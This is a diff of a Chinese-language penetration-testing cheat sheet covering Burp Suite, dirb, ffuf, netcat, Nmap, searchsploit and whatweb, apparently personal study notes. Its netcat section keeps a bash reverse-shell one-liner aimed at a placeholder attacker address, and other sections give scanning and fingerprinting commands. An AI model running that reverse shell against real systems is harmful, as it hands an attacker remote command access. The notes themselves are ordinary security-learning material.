@@ -1,14 +1,10 @@
-# 指令
-
 # 软件
 
 ## Burp Suite
 
-### 安装证书
+安装证书：启动Burp Suite代理服务器，然后打开`http://burp`，从网页下载CA Certificate
 
-启动Burp Suite代理服务器，然后打开`http://burp`，从网页下载CA Certificate
-
-- dirb - 目录扫描
+## dirb - 目录扫描
 
 简单的目录扫描工具。能实现类似功能的还有dirbuster（GUI）和ffuf（模糊测试）等
 
@@ -23,6 +19,16 @@ dirb "example.com"  "/usr/share/dirb/wordlists/big.txt" -o "output.txt"
 | `-z` | 延迟（毫秒）        |
 | `-H` | 请求头，            |
 
+```shell
+$URL = "example.com"
+$WORDS = "/usr/share/dirb/wordlists/big.txt"
+$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+$COOKIE = "name1:value1; name2:value2"
+
+dirb $URL $WORDS -a $UA -c $COOKIE -o "output.txt"  # 基本扫描
+dirb $URL -z 100 -X .php,.html,.txt   # 请求之间间隔100ms；在词典每项后面加上后缀
+```
+
 ## ffuf - 模糊测试
 
 ```shell
@@ -33,7 +39,7 @@ ffuf -v
 
 `msfconsole`
 
-## netcat
+## netcat - 建立&监听连接
 
 简称nc，有建立、监听TCP/UDP连接的功能，可用于简单通信、发送任意数据包。在渗透测试中还常用作反弹shell
 
@@ -59,8 +65,6 @@ bash -i >& "/dev/tcp/$attacker_addr/4444" 0>&1
 ```
 
 3. 建立连接后，目标主机将自己的 Shell 输入输出通过该连接传输，攻击者即可操作目标命令行
-
-
 
 ## Nmap - 端口扫描
 
@@ -128,19 +132,37 @@ TCP握手复习：客户端发送SYN包，服务器返回SYN-ACK包，客户端�
 
 ### 隐蔽选项
 
+NA
 
+## searchsploit - 漏洞搜索
+
+开源漏洞数据库[Exploit DB](https://www.exploit-db.com/)的命令行工具
+
+```shell
+searchsploit Mail Masta   # 查找有关Mail Masta的漏洞。多个关键词是AND关系
+searchsploit -x 41438     # 查看漏洞详情
+```
 
 ## sqlmap - SQL注入工具
+
+NA
 
 ## watweb - 指纹识别
 
 ```shell
-whatweb -v --log-xml=log.xml "example.com"
+$URL = "example.com"
+whatweb -v --log-xml=log.xml $URL
 
-whatweb -p md5 "example.com"  # 插件
+# Aggression和插件
+whatweb -a 1 $URL  # 只做一次请求
+whatweb -a 3 $URL  # 先请求一次，根据结果调用相应插件继续请求
+whatweb -p md5 $URL  # 插件
+
+# Header
+$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+$COOKIE = "name1:value1; name2:value2"
+whatweb --user-agent $UA --cookie $COOKIE --proxy "localhost:8080" $URL
 ```
-
-
 
 # 在线工具
 
@@ -166,7 +188,11 @@ whatweb -p md5 "example.com"  # 插件
 
 ## 其他
 
-[hash反向查询](https://www.cmd5.com)
+[CMD5](https://www.cmd5.com) - Hash反向查询
+
+javascrip反混淆工具：https://deobfuscate.io/、http://www.jsnice.org/
+
+[GTFOBins](https://gtfobins.github.io/) - 用Linux命令攻击
 
 # 常用信息
 
